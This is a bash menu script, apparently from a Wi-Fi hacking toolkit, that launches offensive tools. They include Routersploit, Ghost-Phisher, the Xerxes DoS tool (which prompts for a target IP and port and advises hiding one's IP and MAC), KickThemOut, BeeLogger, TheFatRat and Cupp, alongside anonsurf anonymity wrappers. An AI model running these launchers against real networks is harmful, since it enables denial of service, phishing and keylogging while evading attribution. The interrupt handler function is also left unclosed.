anonsurfStart(){
sudo anonsurf start
}

anonsurfStatus(){
sudo anonsurf status
}


anonsurfStop(){
sudo anonsurf stop
}

anonsurfRestart(){
sudo anonsurf restart
}

anonsurfChange(){
sudo anonsurf change
}

anonsurfStarti2p(){
sudo anonsurf starti2p
}
anonsurfStopi2p(){
sudo anonsurf stopi2p
}

anonip(){
sudo anonsurf myip
}





      tools () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Routersploit"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Zatacker"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Morpheus"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Cupp"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Dracnmap"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}KickThemOut"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Ghost-Phisher"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Xerxes"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Websploit"
echo -e "      ${Red}[${Blue}10${Red}] ${Green}Angry IP Scanner"
echo -e "      ${Red}[${Blue}11${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Routersploit"
  routersploit
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Zatacker"
  Zatacker
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Morpheus"
  morpheus
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Cupp"
  Cupp
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Dracnmap"
  dracnmap
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 KickThemOut"
  kickthemout
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Ghost-Phisher"
  ghostPhisher
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Xerxes"
  Xerxes
     ;;
  9) echo -e "\n[${Green}Selected${White}] Option 9 Websploit"
  websploit
     ;;
  10) echo -e "\n[${Green}Selected${White}] Option 10 Angry IP Scanner"
  AngryIpScanner
     ;;
  11) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


zirikatu () {
cd /tools
cd zirikatu
sudo ./zirikatu.sh

}

routersploit () {
cd /tools
cd routersploit
python3 rsf.py

}

Zatacker () {
cd /tools
cd Zatacker
./ZT.sh
}

morpheus () {
cd /tools
cd morpheus
sudo ./morpheus.sh
}

Hakku () {
cd /tools
cd hakkuframework
./hakku

}

Trity () {
trity

}

Cupp () {
cd /tools
cd cupp
python3 cupp.py -i
}

dracnmap () {
cd /tools
cd Dracnmap
chmod +x dracnmap-v2.2.sh
sudo ./dracnmap-v2.2.sh

}

kickthemout () {
cd /tools
cd kickthemout
sudo python3 kickthemout.py

}


ghostPhisher () {
cd /tools
cd ghost-phisher
cd Ghost-Phisher
chmod +x ghost.py
sudo ./ghost.py
}


Xerxes () {
cd /tools
cd XERXES
echo "Xerxes DoS Attack"
sleep 3
echo "Remember to hide your IP and MAC"
sleep 3
read -p "Enter the IP & Port of target (e.g. 102.102.102.102:80) : " ip
sudo ./xerxes $ip

}


Katana () {
cd /tools
cd KatanaFramework
sudo ./ktf.run
sudo ./ktf.run -h
echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
  
}

websploit () {
sudo websploit
}



BeeLogger () {
cd /tools
cd BeeLogger
sudo python bee.py
}


ezsploit () {
cd /tools
cd ezsploit
sudo ./ezploit.sh


}

TheFatRat () {
sudo fatrat

}

AngryIpScanner () {
sudo sh /usr/bin/ipscan
}


Sn1per () {
cd /tools
cd Sn1per
sudo sniper

}


redhawk () {
cd /tools
cd RED_HAWK
php rhawk.php

}

Help()
{        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}How to set up ad hoc network on my Pi?"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}My tool(s) are not working :("
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Turn off monitor mode"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Uninstall"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Clean"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] How to set up ad hoc network?"
     instructions
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
     fix
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Fixing monitor mode.."
     stopMon
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Running uninstall tool.."
    uninstall
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Cleaning captured handshakes.."
    clean
     exit 0
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


clean () {
sudo rm -r *cap> /dev/null 2>&1
sudo rm -r ipscan_3.7.6_all.deb> /dev/null 2>&1
cleanup
}

uninstall () {

run_script_if_exists "uninstall.sh"

}

stopMon () {
sudo airmon-ng stop $foo > /dev/null 2>&1
sudo airmon-ng stop wlan0mon > /dev/null 2>&1
sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
sudo systemctl start NetworkManager > /dev/null 2>&1
systemctl start wpa_supplicant  > /dev/null 2>&1
echo -e "\e[32mmonitor mode disabled.\e[0m"
}




instructions(){

echo " I know you are a lazy noob, this will do it for you:"
echo " https://github.com/B3ND1X/nm4n00bz"

}






# Script path
SCRIPT_DIR="/home/superuser/air-script"  # Define the air-script directory path

# Function to check if the script exists and run it
run_script_if_exists() {
    local script_name=$1
    if [ -f "$SCRIPT_DIR/$script_name" ]; then
        echo "$(tput setaf 2)Running $script_name..."
        bash "$SCRIPT_DIR/$script_name"
    else
        echo "$(tput setaf 1)$script_name not found!"
    fi
}

fix() {
# Menu logic
echo "Running install tool..."
run_script_if_exists "install.sh"
run_script_if_exists "setup_postfix.sh"
}








log(){
cat besside.log
}

spinner() {        ##### Animation while scanning for available networks #####
sleep 2
echo -e "[${Green}$foo${White}] Preparing for scan..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}$foo${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
done
}

# Define a function to handle interruptions
interrupt_handler() {
    echo "Script interrupted! Cleaning up..."
    stopMon
    # Perform cleanup tasks here


# Set up the trap for SIGINT (Ctrl+C) and SIGTERM (kill command)
trap interrupt_handler SIGINT SIGTERM

# Simulate long-running task
#echo "Script is running... Press Ctrl+C to interrupt."
#while true; do
#    sleep 1
#done
}


targeted () {
checkDependencies
#checkWiFiStatus
banner
menu
}

targeted
